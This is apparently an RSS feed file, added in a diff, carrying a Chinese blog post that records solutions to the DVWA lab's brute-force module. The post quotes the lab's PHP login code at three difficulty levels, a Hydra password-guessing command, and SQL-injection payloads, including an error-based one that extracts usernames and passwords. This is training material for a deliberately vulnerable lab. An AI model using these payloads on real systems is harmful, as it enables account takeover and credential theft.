@@ -1,0 +1,114 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>靶场 on Lao&#39;s Blog</title>
+    <link>https://laoooo.cn/tags/%E9%9D%B6%E5%9C%BA/</link>
+    <description>Recent content in 靶场 on Lao&#39;s Blog</description>
+    <image>
+      <url>https://laoooo.cn/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
+      <link>https://laoooo.cn/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
+    </image>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-CN</language>
+    <lastBuildDate>Sat, 15 May 2021 07:50:48 +0000</lastBuildDate><atom:link href="https://laoooo.cn/tags/%E9%9D%B6%E5%9C%BA/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>DVWA入门靶场学习记录</title>
+      <link>https://laoooo.cn/dvwa%E5%85%A5%E9%97%A8%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</link>
+      <pubDate>Sat, 15 May 2021 07:50:48 +0000</pubDate>
+      
+      <guid>https://laoooo.cn/dvwa%E5%85%A5%E9%97%A8%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</guid>
+      <description>Brute Force 暴力破解 爆破永远是最经典的，也是最有暴力美学的渗透方式。 low 源码： if( isset( $_GET[ &amp;#39;Login&amp;#39; ] ) ) { # 获取用户名和密码 $user = $_GET[ &amp;#39;username&amp;#39; ]; $pass = $_GET[ &amp;#39;password&amp;#39; ]; $pass = md5( $pass ); # 查询验</description>
+      <content:encoded><![CDATA[<h1 id="brute-force-暴力破解">Brute Force 暴力破解</h1>
+<blockquote>
+<p>爆破永远是最经典的，也是最有暴力美学的渗透方式。</p>
+</blockquote>
+<h2 id="low">low</h2>
+<p>源码：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;Login&#39;</span> <span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 获取用户名和密码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;username&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$pass</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;password&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$pass</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span> <span class="nv">$pass</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 查询验证用户名和密码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$query</span>  <span class="o">=</span> <span class="s2">&#34;SELECT * FROM `users` WHERE user = &#39;</span><span class="si">$user</span><span class="s2">&#39; AND password = &#39;</span><span class="si">$pass</span><span class="s2">&#39;;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span> <span class="nv">$query</span> <span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span> <span class="s1">&#39;&lt;pre&gt;&#39;</span> <span class="o">.</span> <span class="nx">mysql_error</span><span class="p">()</span> <span class="o">.</span> <span class="s1">&#39;&lt;/pre&gt;&#39;</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span> <span class="nv">$result</span> <span class="o">&amp;&amp;</span> <span class="nx">mysql_num_rows</span><span class="p">(</span> <span class="nv">$result</span> <span class="p">)</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="c1"># 输出头像和用户名
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nv">$avatar</span> <span class="o">=</span> <span class="nx">mysql_result</span><span class="p">(</span> <span class="nv">$result</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;avatar&#34;</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;Welcome to the password protected area </span><span class="si">{</span><span class="nv">$user</span><span class="si">}</span><span class="s2">&lt;/p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">登录失败</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">mysql_close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>这一题中的问题有很多，解法也不止一种。因为安全等级是Low，也就不考虑太多，这里记录一下两种解法：</p>
+<ol>
+<li>爆破（出题人推荐解法）</li>
+<li>SQL注入</li>
+</ol>
+<h3 id="解法1">解法1</h3>
+<p>这里我用的是<code>Hydra</code>来爆破，Hydra[ˈhaɪdrə]，原意九头蛇，是希腊神话中的怪兽。</p>
+<p>参考命令：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hydra -l admin -P pass.txt -f 127.0.0.1 http-get-form <span class="s2">&#34;/vulnerabilities/brute/:username=^USER^&amp;password=^PASS^&amp;Login=Login#:Username and/or password incorrect.:H=Cookie: 35l9io0j22ej6j6umvc3g561u6; security=low&#34;</span>
+</span></span></code></pre></div><h3 id="解法2">解法2</h3>
+<p>该难度下的爆破题并没有对用户输入项进行过滤，那么考虑最简单的<code>SQL注入</code>，万能密码：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">admin</span><span class="s1">&#39; or &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
+</span></span></span></code></pre></div><p>或者从URL注入：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">username</span><span class="o">=</span><span class="n">admin</span><span class="s1">&#39;--+&amp;password=111&amp;Login=Login#
+</span></span></span></code></pre></div><h4 id="报错注入">报错注入</h4>
+<p>该解法是在尝试SQL注入时，错误的输入了万能密码，导致报错<code>mysql_error() </code>，于是就有了此解法。</p>
+<p><em>Payload来自国光大佬：</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">username</span><span class="o">=</span><span class="n">admin</span><span class="s1">&#39;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(user,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+&amp;password=111&amp;Login=Login#
+</span></span></span></code></pre></div><h2 id="medium">Medium</h2>
+<p>源码：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// 对用户名和密码进行了过滤
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$user</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;username&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$user</span> <span class="o">=</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span> <span class="nv">$user</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$pass</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;password&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$pass</span> <span class="o">=</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span> <span class="nv">$pass</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$pass</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span> <span class="nv">$pass</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 验证用户名和密码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$query</span>  <span class="o">=</span> <span class="s2">&#34;SELECT * FROM `users` WHERE user = &#39;</span><span class="si">$user</span><span class="s2">&#39; AND password = &#39;</span><span class="si">$pass</span><span class="s2">&#39;;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span> <span class="nv">$result</span> <span class="o">&amp;&amp;</span> <span class="nx">mysql_num_rows</span><span class="p">(</span> <span class="nv">$result</span> <span class="p">)</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">登录成功</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">sleep</span><span class="p">(</span> <span class="mi">2</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">登录失败</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>分析源码得知，这一难度下，针对用户输入进行了过滤，但还是可以继续爆破，所以沿用上一个难度的解法即可。</p>
+<h2 id="high">High</h2>
+<p>源码：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// 检测用户的 token
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">checkToken</span><span class="p">(</span> <span class="nv">$_REQUEST</span><span class="p">[</span> <span class="s1">&#39;user_token&#39;</span> <span class="p">],</span> <span class="nv">$_SESSION</span><span class="p">[</span> <span class="s1">&#39;session_token&#39;</span> <span class="p">],</span> <span class="s1">&#39;index.php&#39;</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 过滤用户名和密码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$user</span> <span class="o">=</span> <span class="nv">$checkToken_GET</span><span class="p">[</span> <span class="s1">&#39;username&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$user</span> <span class="o">=</span> <span class="nx">stripslashes</span><span class="p">(</span> <span class="nv">$user</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$user</span> <span class="o">=</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span> <span class="nv">$user</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$pass</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;password&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$pass</span> <span class="o">=</span> <span class="nx">stripslashes</span><span class="p">(</span> <span class="nv">$pass</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$pass</span> <span class="o">=</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span> <span class="nv">$pass</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$pass</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span> <span class="nv">$pass</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 数据匹配
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$query</span>  <span class="o">=</span> <span class="s2">&#34;SELECT * FROM `users` WHERE user = &#39;</span><span class="si">$user</span><span class="s2">&#39; AND password = &#39;</span><span class="si">$pass</span><span class="s2">&#39;;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span> <span class="nv">$query</span> <span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span> <span class="s1">&#39;&lt;pre&gt;&#39;</span> <span class="o">.</span> <span class="nx">mysql_error</span><span class="p">()</span> <span class="o">.</span> <span class="s1">&#39;&lt;/pre&gt;&#39;</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span> <span class="nv">$result</span> <span class="o">&amp;&amp;</span> <span class="nx">mysql_num_rows</span><span class="p">(</span> <span class="nv">$result</span> <span class="p">)</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">登录成功</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">sleep</span><span class="p">(</span> <span class="nx">rand</span><span class="p">(</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">3</span> <span class="p">)</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">登录失败</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div>]]></content:encoded>
+    </item>
+    
+  </channel>
+</rss>
